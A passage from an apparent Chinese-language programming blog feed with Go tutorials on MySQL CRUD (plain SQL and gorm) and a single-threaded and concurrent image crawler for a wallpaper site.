class="keyword">func</span> <span class="title">Select</span><span class="params">()</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> class1 []Class1</span><br><span class="line">	err := Db.Select(&amp;class1, <span class="string">&quot;select id,name,sex from class&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;select error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;class succ&quot;</span>, class1)</span><br><span class="line">	<span class="keyword">for</span> _, v := <span class="keyword">range</span> class1 &#123;</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">        <span class="keyword">if</span> v.Sex != <span class="literal">nil</span> &#123;</span><br><span class="line">			fmt.Println(*v.Sex)</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Insert</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r, err := Db.Exec(<span class="string">&quot;insert into class(name) values(?)&quot;</span>, <span class="string">&quot;三年级一班&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	id, err := r.LastInsertId()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Print(<span class="string">&quot;exec failed&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;insert success&quot;</span>, id)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">()</span></span> &#123;</span><br><span class="line">	res, err := Db.Exec(<span class="string">&quot;update class set name=? where id=?&quot;</span>, <span class="string">&quot;三年级二班&quot;</span>, <span class="number">9</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	row, err := res.RowsAffected()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;row failed, error&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;update success:&quot;</span>, row)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Delete</span><span class="params">()</span></span> &#123;</span><br><span class="line">	res, err := Db.Exec(<span class="string">&quot;delete from class  where id=?&quot;</span>, <span class="number">10</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	row, err := res.RowsAffected()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;row failed, error&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;detele success:&quot;</span>, row)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>代码调用</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/tmysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmysql.InitDb()</span><br><span class="line">	tmysql.Select()</span><br><span class="line">	tmysql.Insert()</span><br><span class="line">	tmysql.Update()</span><br><span class="line">	tmysql.Delete()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="gorm"><a href="#gorm" class="headerlink" title="gorm"></a>gorm</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ggorm</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line">	<span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 安装gorm</span></span><br><span class="line"><span class="comment">//go get gorm.io/gorm</span></span><br><span class="line"><span class="comment">// 安装mysql驱动</span></span><br><span class="line"><span class="comment">//go get gorm.io/driver/mysql</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> User <span class="keyword">struct</span> &#123;</span><br><span class="line">	gorm.Model      <span class="comment">// 内置的结构提</span></span><br><span class="line">	Id         <span class="type">uint</span> <span class="comment">// 默认为主键</span></span><br><span class="line">	Name       <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitDb</span><span class="params">()</span></span> &#123;</span><br><span class="line">	dsn := <span class="string">&quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span></span><br><span class="line">	database, err := gorm.Open(mysql.Open(dsn), &amp;gorm.Config&#123;&#125;)</span><br><span class="line">	<span class="comment">// database, err := gorm.Open(&quot;mysql&quot;, &quot;root:123456@tcp(127.0.0.1:3306)/test?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;)</span></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;open mysql error:&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	Db = database</span><br><span class="line">	<span class="comment">//// 根据User结构体，自动创建表结构,表名为users,如果表存在，不会创建</span></span><br><span class="line">	Db.AutoMigrate(&amp;User&#123;&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Close</span><span class="params">()</span></span> &#123;</span><br><span class="line">	sqlDB, _ := Db.DB()</span><br><span class="line">	sqlDB.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Insert</span><span class="params">()</span></span> &#123;</span><br><span class="line">	u := User&#123;</span><br><span class="line">		Name: <span class="string">&quot;张山1&quot;</span>,</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err := Db.Create(&amp;u).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;create is wrong,error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;创建数据成功&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Select</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">var</span> users []User</span><br><span class="line">	<span class="comment">// SELECT * FROM users;</span></span><br><span class="line">	<span class="keyword">if</span> err := Db.Find(&amp;users).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;find failed, error:&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> users &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;k=&quot;</span>, k, <span class="string">&quot;v=&quot;</span>, v)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//SELECT * FROM users WHERE name = &#x27;张山1&#x27;;</span></span><br><span class="line">	Db.Where(<span class="string">&quot;name=?&quot;</span>, <span class="string">&quot;张山1&quot;</span>).Find(&amp;users)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(users) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;find failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> k, v := <span class="keyword">range</span> users &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;k1=&quot;</span>, k, <span class="string">&quot;v1=&quot;</span>, v)</span><br><span class="line">		fmt.Println(v.Name)</span><br><span class="line">		fmt.Println(v.Id)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Update</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: <span class="number">1</span>&#125;</span><br><span class="line">	d := Db.Model(user).Update(<span class="string">&quot;Name&quot;</span>, <span class="string">&quot;lisi&quot;</span>)</span><br><span class="line">	<span class="keyword">if</span> d.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;update failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(<span class="string">&quot;update success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Detele</span><span class="params">()</span></span> &#123;</span><br><span class="line">	user := &amp;User&#123;Id: <span class="number">2</span>&#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">// 查询不到此数据，就说明无法删除</span></span><br><span class="line">	<span class="keyword">var</span> users []User</span><br><span class="line">	Db.Where(<span class="string">&quot;id=?&quot;</span>, <span class="number">2</span>).Find(&amp;users)</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">len</span>(users) == <span class="number">0</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 永久删除</span></span><br><span class="line">	d := Db.Unscoped().Delete(&amp;user)</span><br><span class="line">	<span class="comment">// 下面的语句有问题无论删除是否成功都成功</span></span><br><span class="line">	<span class="keyword">if</span> d.Error != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;del failed&quot;</span>)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	fmt.Println(<span class="string">&quot;del success&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>代码调用</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"># hello_work/main.<span class="keyword">go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/ggorm&quot;</span></span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/tmysql&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	tmysql.InitDb()</span><br><span class="line">	tmysql.Select()</span><br><span class="line">	tmysql.Insert()</span><br><span class="line">	tmysql.Update()</span><br><span class="line">	tmysql.Delete()</span><br><span class="line"></span><br><span class="line">	ggorm.InitDb()</span><br><span class="line">	ggorm.Insert()</span><br><span class="line">	ggorm.Update()</span><br><span class="line">	ggorm.Detele()</span><br><span class="line">	ggorm.Close()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="来自"><a href="#来自" class="headerlink" title="来自"></a>来自</h2><ul>
<li><p><a href="https://gorm.io/zh_CN/docs/index.html">gorm</a></p>
</li>
<li><p><a href="https://www.topgoer.com/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%93%8D%E4%BD%9C/go%E6%93%8D%E4%BD%9Cmysql/">go操作mysql</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>go</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>go 爬虫练习</title>
    <url>/aposts/f9d23e4/</url>
    <content><![CDATA[<h2 id="分析网站"><a href="#分析网站" class="headerlink" title="分析网站"></a>分析网站</h2><ul>
<li><p>打开爬虫的目标网站：<a href="http://www.52desktop.cn/html/DLZM/KPBZ/20191205/15898.html">http://www.52desktop.cn/html/DLZM/KPBZ/20191205/15898.html</a></p>
</li>
<li><p>点击下一张图片，发现后面多了个2，往后的下一张直接进行了累加，最终网站为：<code>.../KPBZ/20191205/15898_&#123;n&#125;.html</code></p>
</li>
</ul>
<p><img src="/aposts/f9d23e4/image-20230620190153496.png" alt="image-20230620190153496"></p>
<ul>
<li>点击下载图片时，经过分析最终的下载地址的n数量减一，为正则提取或者图片查找做准备<code>http://i.52desktop.cn:81/upimg/allimg/&#123;n&#125;/201912415221023477802.jpg</code></li>
</ul>
<p><img src="/aposts/f9d23e4/image-20230620190505925.png" alt="image-20230620190505925"></p>
<h2 id="单线程"><a href="#单线程" class="headerlink" title="单线程"></a>单线程</h2><ul>
<li><code>hello_work\craw\Craw1.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello_work\craw\Craw1.go</span></span><br><span class="line"><span class="keyword">package</span> crawl</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;bufio&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;path&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	<span class="comment">// 正则查找图片的地址</span></span><br><span class="line">	reImg = <span class="string">`http://i.52desktop.cn:81/upimg/allimg/[^&quot;]+?(\.((jpg)|(png)|(jpeg)|(gif)|(bmp)))`</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取链接中所有的内容</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetPageStr</span><span class="params">(url <span class="type">string</span>)</span></span> (pageStr <span class="type">string</span>) &#123;</span><br><span class="line"></span><br><span class="line">	resp, err := http.Get(url)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;http.Get error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">	<span class="comment">// 读取页面内容</span></span><br><span class="line">	pagebytes, err := ioutil.ReadAll(resp.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;ioutil.ReadAll error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 字节转换为字符串</span></span><br><span class="line">	pageStr = <span class="type">string</span>(pagebytes)</span><br><span class="line">	<span class="keyword">return</span> pageStr</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 下载图片，核心内容是获取图片的reader、write对象</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">downloadImg</span><span class="params">(savePath <span class="type">string</span>, url <span class="type">string</span>)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">	v, err := http.Get(url)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;http.Get error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> v.Body.Close()</span><br><span class="line">	fileName := path.Base(url) <span class="comment">// 获取文件名</span></span><br><span class="line">	<span class="comment">// 获得get请求响应的reader对象</span></span><br><span class="line">	reader := bufio.NewReaderSize(v.Body, <span class="number">32</span>*<span class="number">1024</span>)</span><br><span class="line">	<span class="comment">// 创建单个文件保存下来</span></span><br><span class="line">	file, err := os.Create(savePath + fileName)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;ioutil.WriteFile error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// // 获得文件的writer对象</span></span><br><span class="line">	writer := bufio.NewWriter(file)</span><br><span class="line"></span><br><span class="line">	written, err := io.Copy(writer, reader)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;io.Copy error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(fileName, <span class="string">&quot;download is success, Total length:&quot;</span>, written)</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 给main.go进行调用的外部地址</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCrawl1Img</span><span class="params">()</span></span> &#123;</span><br><span class="line">	start := time.Now()</span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">2</span>; i &lt;= <span class="number">21</span>; i++ &#123;</span><br><span class="line">		<span class="comment">// 根据观察规则，发现下载图片地址网站</span></span><br><span class="line">		url := <span class="string">&quot;http://www.52desktop.cn/html/DLZM/KPBZ/20191205/15898_&quot;</span> + strconv.Itoa(i) + <span class="string">&quot;.html&quot;</span></span><br><span class="line">		pageStr := GetPageStr(url)</span><br><span class="line">		re := regexp.MustCompile(reImg)</span><br><span class="line">		results := re.FindAllStringSubmatch(pageStr, <span class="number">-1</span>) <span class="comment">//  -1 表示搜索所有可能的匹配项。</span></span><br><span class="line">		<span class="keyword">for</span> _, result := <span class="keyword">range</span> results &#123;</span><br><span class="line">			<span class="keyword">if</span> strings.Contains(result[<span class="number">0</span>], <span class="string">&quot;20191204&quot;</span>) &#123; <span class="comment">// 过滤条件读取图片地址</span></span><br><span class="line">				downloadImg(<span class="string">&quot;E:\\proj\\gowork\\img\\&quot;</span>, result[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	elapse := time.Since(start)</span><br><span class="line">	fmt.Println(<span class="string">&quot;elapsed time is : &quot;</span>, elapse, <span class="string">&quot;s&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>hello_work&#x2F;main.go</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// hello_work/main.go</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;example.com/hello_work/hello_work/crawl&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	crawl.GetCrawl1Img()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>调用,共下载了20张图片，耗时20秒</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"> E:\proj\gowork&gt; <span class="keyword">go</span> run .\hello_work\main.<span class="keyword">go</span></span><br><span class="line"><span class="number">201912415221023477802.</span>jpg download is success, Total length: <span class="number">344218</span></span><br><span class="line"><span class="number">201912415221023477802.</span>jpg download is success, Total length: <span class="number">344218</span></span><br><span class="line"><span class="number">201912415221026577803.</span>jpg download is success, Total length: <span class="number">342307</span></span><br><span class="line">...</span><br><span class="line"><span class="number">2019124152210921778021.</span>jpg download is success, Total length: <span class="number">340471</span></span><br><span class="line">elapsed time is :  <span class="number">20.861619</span>s </span><br></pre></td></tr></table></figure>

<h2 id="并发爬虫"><a href="#并发爬虫" class="headerlink" title="并发爬虫"></a>并发爬虫</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><ul>
<li>初始化一个数据管道</li>
<li>爬虫写出：创建多个协程用于添加图片</li>
<li>任务统计协程：检查多个个任务是否都完成，完成则关闭数据管道</li>
<li>下载协程：从管道里读取链接并下载</li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><ul>
<li><code>hello_work/crawl/Crawl2.go</code></li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> crawl</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;io/ioutil&quot;</span></span><br><span class="line">	<span class="string">&quot;net/http&quot;</span></span><br><span class="line">	<span class="string">&quot;path&quot;</span></span><br><span class="line">	<span class="string">&quot;regexp&quot;</span></span><br><span class="line">	<span class="string">&quot;strconv&quot;</span></span><br><span class="line">	<span class="string">&quot;strings&quot;</span></span><br><span class="line">	<span class="string">&quot;sync&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">	<span class="comment">// 正则提取表达式</span></span><br><span class="line">	geReImg = <span class="string">`http://i.52desktop.cn:81/upimg/allimg/[^&quot;]+?(\.((jpg)|(png)|(jpeg)|(gif)|(bmp)))`</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// 存放图片链接的数据管道</span></span><br><span class="line">	chanImageUrls <span class="keyword">chan</span> <span class="type">string</span></span><br><span class="line">	<span class="comment">// 启动多个goroutine，sync.WaitGroup来实现goroutine的同步</span></span><br><span class="line">	waitGroup sync.WaitGroup</span><br><span class="line">	<span class="comment">// 用于监控协程</span></span><br><span class="line">	chanTask <span class="keyword">chan</span> <span class="type">string</span></span><br><span class="line">	<span class="comment">// 监控协程总数</span></span><br><span class="line">	chanTaskCount = <span class="number">23</span></span><br><span class="line">	<span class="comment">// 监控当前的下载任务是否完成的总数</span></span><br><span class="line">	count <span class="type">int</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 爬取图片链接，获取当前页的所有图片链接</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getImgs</span><span class="params">(url <span class="type">string</span>)</span></span> (urls []<span class="type">string</span>) &#123;</span><br><span class="line">	pageStr := GetPageStr(url)</span><br><span class="line">	re := regexp.MustCompile(geReImg)</span><br><span class="line">	results := re.FindAllStringSubmatch(pageStr, <span class="number">-1</span>) <span class="comment">//  -1 表示搜索所有可能的匹配项。</span></span><br><span class="line">	fmt.Printf(<span class="string">&quot;共找到%d条结果\n&quot;</span>, <span class="built_in">len</span>(results))</span><br><span class="line">	<span class="keyword">for</span> _, result := <span class="keyword">range</span> results &#123;</span><br><span class="line">		url := result[<span class="number">0</span>]</span><br><span class="line">		<span class="keyword">if</span> strings.Contains(result[<span class="number">0</span>], <span class="string">&quot;20191204&quot;</span>) &#123; <span class="comment">// 过滤条件读取图片地址</span></span><br><span class="line">			urls = <span class="built_in">append</span>(urls, url)</span><br><span class="line">			<span class="comment">// fmt.Println(url)</span></span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> urls</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">getImgUrls</span><span class="params">(url <span class="type">string</span>)</span></span> &#123;</span><br><span class="line">	urls := getImgs(url)</span><br><span class="line">	<span class="comment">// 遍历切片里所有链接，存入数据管道</span></span><br><span class="line">	<span class="keyword">for</span> _, url := <span class="keyword">range</span> urls &#123;</span><br><span class="line">		<span class="comment">// 存放图片链接的数据管道，发送图片链接</span></span><br><span class="line">		chanImageUrls &lt;- url</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 标识当前协程完成</span></span><br><span class="line">	<span class="comment">// 每完成一个任务，写一条数据</span></span><br><span class="line">	<span class="comment">// 用于监控协程知道已经完成了几个任务</span></span><br><span class="line">	chanTask &lt;- url</span><br><span class="line">	waitGroup.Done()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 任务统计</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">CheckOk</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		<span class="comment">// 从chanTask中接收值并赋值给变量,url</span></span><br><span class="line">		url := &lt;-chanTask</span><br><span class="line">		fmt.Printf(<span class="string">&quot;%s 完成了爬虫任务\n&quot;</span>, url)</span><br><span class="line">		count++</span><br><span class="line">		<span class="comment">// 任务统计个协程是否全部完成,完成了久关闭通道</span></span><br><span class="line">		<span class="comment">// 因为的我循环起始地址的索引为2，所以这里减去2</span></span><br><span class="line">		<span class="keyword">if</span> count == chanTaskCount<span class="number">-2</span> &#123;</span><br><span class="line">			<span class="built_in">close</span>(chanImageUrls)</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	waitGroup.Done()</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">downloadFile</span><span class="params">(savePath <span class="type">string</span>, url <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"></span><br><span class="line">	v, err := http.Get(url)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;http.Get error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> v.Body.Close()</span><br><span class="line">	fileName := savePath + path.Base(url) <span class="comment">// 获取文件名</span></span><br><span class="line">	bytes, err := ioutil.ReadAll(v.Body)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;io.ReadAll error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 直接写入内容，比Crawl1.go代码更简单</span></span><br><span class="line">	err = ioutil.WriteFile(fileName, bytes, <span class="number">0666</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;ioutil.WriteFile error&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	fmt.Println(fileName, <span class="string">&quot; download is success&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 下载协程，从hanImageUrls管道中读取链接下载,读取的数据来自于这里函数getImgUrls，对chanImageUrls的写入</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">DownloadImg</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="keyword">for</span> url := <span class="keyword">range</span> chanImageUrls &#123;</span><br><span class="line">		downloadFile(<span class="string">&quot;E:\\proj\\gowork\\img\\&quot;</span>, url)</span><br><span class="line">	&#125;</span><br><span class="line">	waitGroup.Done()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCrawl2Img</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 初始化管道</span></span><br><span class="line">	chanImageUrls = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, <span class="number">100</span>)</span><br><span class="line">	chanTask = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, chanTaskCount)</span><br><span class="line">	start := time.Now()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i := <span class="number">2</span>; i &lt; chanTaskCount; i++ &#123;</span><br><span class="line">		waitGroup.Add(<span class="number">1</span>)</span><br><span class="line">		<span class="comment">// 根据观察规则，发现下载图片地址网站</span></span><br><span class="line">		<span class="keyword">go</span> getImgUrls(<span class="string">&quot;http://www.52desktop.cn/html/DLZM/KPBZ/20191205/15898_&quot;</span> + strconv.Itoa(i) + <span class="string">&quot;.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// 任务统计个协程是否全部完成</span></span><br><span class="line">	